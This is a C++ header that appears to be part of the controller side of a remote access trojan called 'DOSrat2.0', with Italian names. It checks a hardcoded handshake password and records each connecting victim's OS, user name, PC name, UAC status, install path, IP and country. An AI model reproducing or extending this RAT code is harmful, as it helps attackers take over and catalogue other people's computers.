#pragma once

class COMUNICAZIONI
{
	private:
	static void TerminaConnessione(SOCKET Sock)
	{
		TcpIP::SetTimeout(0, Sock);
		closesocket(Sock);
	}

	public:
	static void Inizializzazione(int Index)
	{
		char Pass[10]; // DOSrat2.0
		vector<char> Buff;
		char Size[5] = { 0 };
		IPinfo GeoIP;
		EasyMSGB msgb;

		TcpIP::SetTimeout(10000, Clients[Index].sock);

		if (recv(Clients[Index].sock, Pass, sizeof(Pass), 0) == SOCKET_ERROR)
		{
			TerminaConnessione(Clients[Index].sock);
			return;
		}
		if ((string)Pass != "DOSrat2.0")
		{
			TerminaConnessione(Clients[Index].sock);
			return;
		}
		if (send(Clients[Index].sock, "DOSrat2.0", 10, 0) == SOCKET_ERROR)
		{
			TerminaConnessione(Clients[Index].sock);
			return;
		}

		TcpIP::SetTimeout(0, Clients[Index].sock);

		recv(Clients[Index].sock, Size, sizeof(Size), 0);
		Buff.resize(atoi(Size));
		recv(Clients[Index].sock, &Buff[0], atoi(Size), 0);

		json data = json::parse(string(Buff.begin(), Buff.end()));

		Clients[Index].IsConnected = true;
		Clients[Index].info.InstallPath = data["InstallPath"];
		Clients[Index].info.OS = data["OS"];
		Clients[Index].info.PCname = data["PCname"];
		Clients[Index].info.UAC = data["UAC"];
		Clients[Index].info.UserName = data["UserName"];
		Clients[Index].info.Versione = data["Versione"];

		Clients[Index].info.IP = TcpIP::GetIP(Clients[Index].sock);
		Clients[Index].info.Nazione = (IPlocation::GetInfoFromIP(Clients[Index].info.IP, GeoIP) == 0) ? GeoIP.CountryCode : "";

		Clu->AggiornaCount();
		Clu->AggiornaTitolo();
	}
};